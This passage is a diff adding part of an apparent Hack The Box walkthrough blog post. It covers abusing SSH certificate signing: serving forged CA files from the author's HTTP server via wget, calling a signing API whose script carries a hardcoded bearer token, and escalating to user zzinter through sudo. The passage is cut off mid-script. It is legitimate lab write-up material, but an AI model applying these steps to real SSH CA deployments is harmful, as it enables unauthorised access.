+alertBox.classList.toggle('open');
+alertBox.classList.toggle('collapsed');
+if (alertBox.classList.contains('open')) {
+alertContent.style.display = 'block';
+icon.classList.remove('open');
+icon.classList.add('collapsed');
+} else {
+icon.classList.remove('collapsed');
+icon.classList.add('open');
+alertContent.style.display = 'none';
+}
+}
+&lt;/script>
+&lt;p>It will generate a &lt;code>ctf-cert.pub&lt;/code> file. Now we can copy all the generated files into the &lt;code>decommission_old_ca&lt;/code> directory. We can start a python http server in our machine and use wget to download all the files&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## our machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mkdir www
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mv ctf* www &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#fabd2f">cd&lt;/span> www
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>python3 -m http.server &lt;span style="color:#d3869b">8000&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## htb machine&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>wget http://10.10.10.1:8000/ -r -nd &lt;span style="color:#fe8019">&amp;amp;&amp;amp;&lt;/span> rm index.html
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can login to &lt;code>zzinter&lt;/code> using the ssh private key:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh zzinter@10.10.11.27 -i ctf -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>ctf-cert.pub
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809200037.webp">&lt;/figure>
+&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;h3 id="local-enumeration-1">Local Enumeration&lt;/h3>
+&lt;p>There&amp;rsquo;s a &lt;code>sign_key_api.sh&lt;/code> file in the home&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809200324.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>usage &lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#b8bb26"> &amp;lt;public_key_file&amp;gt; &amp;lt;username&amp;gt; &amp;lt;principal&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$#&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -ne &lt;span style="color:#d3869b">3&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$1&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$2&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>principal_str&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$3&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>supported_principals&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;webserver,analytics,support,security&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IFS&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;,&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">read&lt;/span> -ra principal &lt;span style="color:#fe8019">&amp;lt;&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal_str&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> word in &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">${&lt;/span>principal[@]&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$supported_principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | grep -qw &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#39; is not a supported principal.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Choose from:&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; webserver - external web servers - webadmin user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; analytics - analytics team databases - analytics user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; support - IT support server - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; security - SOC servers - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Public key file &amp;#39;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat $public_key_file&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -s signserv.ssg.htb/v1/sign -d &lt;span style="color:#b8bb26">&amp;#39;{&amp;#34;pubkey&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;, &amp;#34;username&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$username&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;, &amp;#34;principals&amp;#34;: &amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;&amp;#34;}&amp;#39;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -H &lt;span style="color:#b8bb26">&amp;#34;Authorization:Bearer 7Tqx6owMLtnt6oeR2ORbWmOPk30z4ZH901kH6UUT6vNziNqGrYgmSve5jCmnPJDE&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This script calls and api to sign ssh public keys. We can run the script and give it a public key, username, and a principal value (from &lt;code>webserver&lt;/code>, &lt;code>analytics&lt;/code>, &lt;code>support&lt;/code>, and &lt;code>security&lt;/code>). This api might be trying to sign the given public key with a CA certificate present in the host machine. To sign the pubilc key, we have to figure out valid username and principal combination. I first checked user &lt;code>root&lt;/code> and all of he mentioned principals. But none of them worked, then after some more trial and error I found a valid combo &lt;code>support:support&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-support
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## copy the pub file into the htb machine and run the script&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-support.pub support support
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This will generate a &lt;code>cert&lt;/code> file and we can login to ssh using this cert file and the private key. Note that there&amp;rsquo;s to ssh port open &lt;code>22&lt;/code> and &lt;code>2222&lt;/code>. The &lt;code>22&lt;/code> port is for the docker and maybe the &lt;code>2222&lt;/code> is for the host.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh support@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-support -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>support.cert
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809202958.webp">&lt;/figure>
+&lt;h3 id="privilege-escalation-vector">Privilege Escalation vector&lt;/h3>
+&lt;p>I checked the other users in the machine&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205216.webp">&lt;/figure>
+&lt;p>There&amp;rsquo;s a zzinter user in this machine. We can try generating another &lt;code>cert&lt;/code> file using the previous script for this user. I tried all 4 principals mentioned in the script but none of them worked.
+We can look inside &lt;code>/etc/ssh&lt;/code> to know how this is configured. I recomend you to check this blog to learn more about CAs and Principals &lt;a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d">https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d&lt;/a>&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205819.webp">&lt;/figure>
+&lt;p>root login is enabled in the &lt;code>sshd_config&lt;/code> file. If we check the &lt;code>/etc/ssh/sshd_conf.d/sshcerts.conf&lt;/code> we can see where the principals are stored&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809205926.webp">&lt;/figure>
+&lt;p>As we can see there are 2 more principals that were not mentioned in the previous script that used to sign the ssh public key.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809210224.webp">&lt;/figure>
+&lt;p>Let&amp;rsquo;s copy the previous script, ad these two new principals to the script and try login as root.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129222723.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-root
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-root.pub root root_user
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129222955.webp">&lt;/figure>
+&lt;p>We can&amp;rsquo;t sign the key for root user.&lt;/p>
+&lt;p>Let&amp;rsquo;s try zzinter&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t rsa -f ctf-zzinter
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bash sign_key_api.sh ./ctf-zzinter.pub zzinter zzinter_temp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020241129223252.webp">&lt;/figure>
+&lt;p>We got an output, and if we tried to log in using this cert file as user zzinter&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh zzinter@10.10.11.27 -p &lt;span style="color:#d3869b">2222&lt;/span> -i ctf-zzinter -o CertificateFile&lt;span style="color:#fe8019">=&lt;/span>zzinter.cert
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We logged in as zzinter&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809210913.webp">&lt;/figure>
+&lt;p>User zzinter can run &lt;code>/opt/sign_key.sh&lt;/code> with sudo privileges&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/resource/Pasted%20image%2020240809211043.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#8ec07c">&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>usage &lt;span style="color:#fe8019">()&lt;/span> &lt;span style="color:#fe8019">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Usage: &lt;/span>$0&lt;span style="color:#b8bb26"> &amp;lt;ca_file&amp;gt; &amp;lt;public_key_file&amp;gt; &amp;lt;username&amp;gt; &amp;lt;principal&amp;gt; &amp;lt;serial&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">exit&lt;/span> &lt;span style="color:#d3869b">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$#&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> -ne &lt;span style="color:#d3869b">5&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$1&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>public_key_file&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$2&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>username&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$3&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>principal&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$4&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>serial&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$5&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: CA file &amp;#39;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $ca &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;/etc/ssh/ca-it&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>itca&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat /etc/ssh/ca-it&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ca&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fe8019">$(&lt;/span>cat &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$ca_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#fe8019">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[[&lt;/span> $itca &lt;span style="color:#fe8019">==&lt;/span> $ca &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Use API for signing with this CA.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#fe8019">[&lt;/span> ! -f &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> &lt;span style="color:#fe8019">]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: Public key file &amp;#39;&lt;/span>$public_key_file&lt;span style="color:#b8bb26">&amp;#39; not found.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>supported_principals&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;webserver,analytics,support,security&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>IFS&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;,&amp;#39;&lt;/span> &lt;span style="color:#fabd2f">read&lt;/span> -ra principal &lt;span style="color:#fe8019">&amp;lt;&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$principal_str&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">for&lt;/span> word in &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>&lt;span style="color:#b8bb26">${&lt;/span>principal[@]&lt;span style="color:#b8bb26">}&lt;/span>&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">do&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$supported_principals&lt;span style="color:#b8bb26">&amp;#34;&lt;/span> | grep -qw &lt;span style="color:#b8bb26">&amp;#34;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#34;&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$word&lt;span style="color:#b8bb26">&amp;#39; is not a supported principal.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Choose from:&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; webserver - external web servers - webadmin user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; analytics - analytics team databases - analytics user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; support - IT support server - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34; security - SOC servers - support user&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">done&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> ! &lt;span style="color:#fe8019">[[&lt;/span> $serial &lt;span style="color:#fe8019">=&lt;/span>~ ^&lt;span style="color:#fe8019">[&lt;/span>0-9&lt;span style="color:#fe8019">]&lt;/span>+$ &lt;span style="color:#fe8019">]]&lt;/span>; &lt;span style="color:#fe8019">then&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Error: &amp;#39;&lt;/span>$serial&lt;span style="color:#b8bb26">&amp;#39; is not a number.&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> usage
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">fi&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
